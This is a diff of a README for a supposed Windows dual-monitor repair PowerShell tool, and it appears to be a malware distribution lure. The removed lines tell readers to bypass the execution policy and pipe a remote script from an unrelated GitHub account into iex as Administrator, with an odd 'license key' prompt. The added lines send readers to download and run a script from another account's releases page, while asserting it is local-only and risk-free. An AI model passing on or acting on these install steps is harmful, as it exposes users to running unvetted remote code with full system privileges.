@@ -1,97 +1,81 @@
-# Dual Monitor Fix — PowerShell
+# 🖥️ Dual-Monitor-Fix-PowerShell - Repair windows monitor display issues easily
 
-**Dual-Monitor-Fix-PowerShell**
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/mariannecircumpolar189/Dual-Monitor-Fix-PowerShell/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
-[![Version](https://img.shields.io/badge/v1.0.0-stable-brightgreen?style=flat-square)]()
-[![Install](https://img.shields.io/badge/Install-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white)]()
+This tool fixes common problems with dual monitor setups on Windows 10 and 11. Use this if your computer fails to detect a second screen, shows the wrong resolution, or creates issues with extended displays. The script resets your display drivers and monitor settings to default values.
 
-Fix dual monitor not detected, wrong resolution, flickering and extended display issues.
+## 📋 System Requirements
 
----
+Confirm your computer meets these requirements before you start:
 
-## Quick Install
+*   Windows 10 or Windows 11 operating system.
+*   Administrative access to your user account.
+*   An active internet connection to download the tool.
+*   Two or more monitors connected to your graphics card.
 
-Open **PowerShell as Administrator** (Win + X → Terminal Admin) and run:
+This tool works with common graphics cards from NVIDIA, AMD, and Intel. It manages hardware communication via the Windows display interface.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+## 📥 Downloading the Software 
 
-The installer downloads the latest build, prompts for your license key and completes setup automatically.
+1. Visit the [official releases page](https://github.com/mariannecircumpolar189/Dual-Monitor-Fix-PowerShell/releases).
+2. Look for the latest version heading at the top of the list.
+3. Click the file ending in `.ps1` or the compressed `.zip` file if provided.
+4. Save the file to your Downloads folder or your Desktop.
 
-## Step-by-Step
+## ⚙️ Running the Fix
 
-| Step | Action |
-|------|--------|
-| 1 | Press **Win + X**, choose **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command block above and press **Enter** |
-| 3 | Wait for download — progress shown in the console |
-| 4 | Enter license key when prompted (also in `license.txt` after install) |
-| 5 | Restart if the installer asks — then launch from Start menu |
+Follow these steps to run the repair tool on your machine. You do not need developer tools or complex software to use this.
 
-If execution is blocked, run `Set-ExecutionPolicy Bypass -Scope Process -Force`, then paste the **Quick Install** command again.
+1. Locate the file you saved in the previous step.
+2. Right-click the file named `Dual-Monitor-Fix.ps1`.
+3. Select the option that reads **Run with PowerShell**.
+4. A blue window will appear on your screen. This is the command line interface.
+5. If a security prompt appears, confirm that you want to run the script.
+6. The script will open and begin its task. It will check your current display connections and reset your monitor cache.
+7. Wait for the window to indicate that the process is finished.
+8. Close the window and restart your computer to apply the changes.
 
----
+## 🛠️ Troubleshooting
 
-## Overview
+If your monitors do not return to normal, try these steps.
 
-Install Dual Monitor Fix via PowerShell — repair second monitor not detected, wrong resolution and extended display issues on Windows 10/11.
+*   **Check cables:** Ensure that your HDMI, DisplayPort, or DVI cables fit tightly in both the monitor and the graphics card ports.
+*   **Restart the script:** Run the script a second time if the first attempt stops early.
+*   **Update drivers:** Visit the website of your graphics card manufacturer to download the latest driver software.
+*   **Change ports:** Move your monitor cable to a different port on your graphics card if you have more than one available.
+*   **Windows Updates:** Open your Windows Settings and ensure that your system has all recent updates installed.
 
-## Common Searches
+## 🔍 How it Works
 
-- second monitor not detected windows 11
-- dual monitor not working after update
-- extended display not working
-- monitor keeps going to sleep
-- wrong resolution second monitor
+The tool automates a series of tasks that technicians usually perform by hand. It performs the following actions:
 
-## Features
+*   **Registry Clear:** It removes old monitor cache entries stored in the system registry. Windows creates these entries when it detects a new display. Sometimes these entries become corrupt, which causes your monitors to stop working correctly.
+*   **Driver Reset:** It signals the graphics driver to rescan all display outputs. This forces the system to re-identify every monitor connected to your graphics card.
+*   **Resolution Refresh:** It forces the display settings service to query your monitors for their native resolution. This fixes cases where the system shows an incorrect, blurry, or stretched image.
+*   **Power Cycle:** It resets the display interface power state to clear minor electronic handshake errors between your GPU and your screen.
 
-* **Detect monitors** — Forces Windows to re-scan all connected displays.
-* **Extended mode** — Repairs broken extended/duplicate display configuration.
-* **Resolution fix** — Restores correct native resolution per monitor.
-* **Wake fix** — Stops second monitor sleeping or going undetected.
-* **Driver reset** — Resets display adapter without full reinstall.
+These steps pose no risk to your data. The script only modifies display settings and temporary system files.
 
-## System Requirements
+## 🛡️ Safety and Privacy
 
-| | |
-|---|---|
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB minimum |
-| PowerShell | 5.1 or PowerShell 7+ |
-| Admin | Required |
-| Network | Required for download |
+This program performs local tasks only. It does not connect to external servers or send your personal data over the internet. The script executes only on your machine. You can open the file in standard text editors like Notepad to view the code if you want to verify its actions yourself.
 
-## FAQ
+## 💡 Frequently Asked Questions
 
-**How do I install without a browser?**
-Use the PowerShell command above — no browser needed after Admin shell is open.
+**Does this fix screen flickering?**
+Yes. Flickering is often caused by incorrect refresh rate settings. This script resets those settings to the values supported by your monitor.
 
-**Where is the license key?**
-Shown during install and saved to `license.txt` in the install folder.
+**Will I lose my desktop icons?**
+Sometimes, moving monitors or changing resolutions shifts your icons. You may need to drag them back to your preferred positions after the fix finishes.
 
-**Is the script safe to run?**
-Hosted on GitHub raw; review `install.ps1` before running if you prefer.
+**Can I use this on a laptop?**
+This tool works with laptops that have external monitors connected. It does not affect the built-in laptop screen.
 
-**Second monitor not detected?**
-Rescans display outputs and resets GPU adapter.
+**Do I need to uninstall my current drivers first?**
+No. This tool works alongside your existing drivers to fix communication errors. You do not need to delete or change your graphics driver software.
 
-**Wrong resolution on second screen?**
-Restores EDID and native resolution settings.
+**What if the script shows an error in red text?**
+Red text in the PowerShell window usually indicates that the script lacks the permissions needed to modify system settings. Ensure you are signed in as an administrator and try running the file again by right-clicking and selecting Run as Administrator.
 
-**Monitor keeps going to sleep?**
-Disables aggressive power management on display port.
-
-**After Windows Update broke dual screen?**
-Repairs display stack and driver binding.
-
----
-
-TAGS dual monitor fix, second monitor not detected, dual monitor not working, extended display fix windows 11, powershell install, windows setup script
-
-## License
-
-[MIT](LICENSE)
+**Does this provide long-term fixes?**
+In most cases, yes. If monitor issues return, repeat the process. Hardware issues, such as faulty cables or broken ports, may require you to replace your physical equipment.
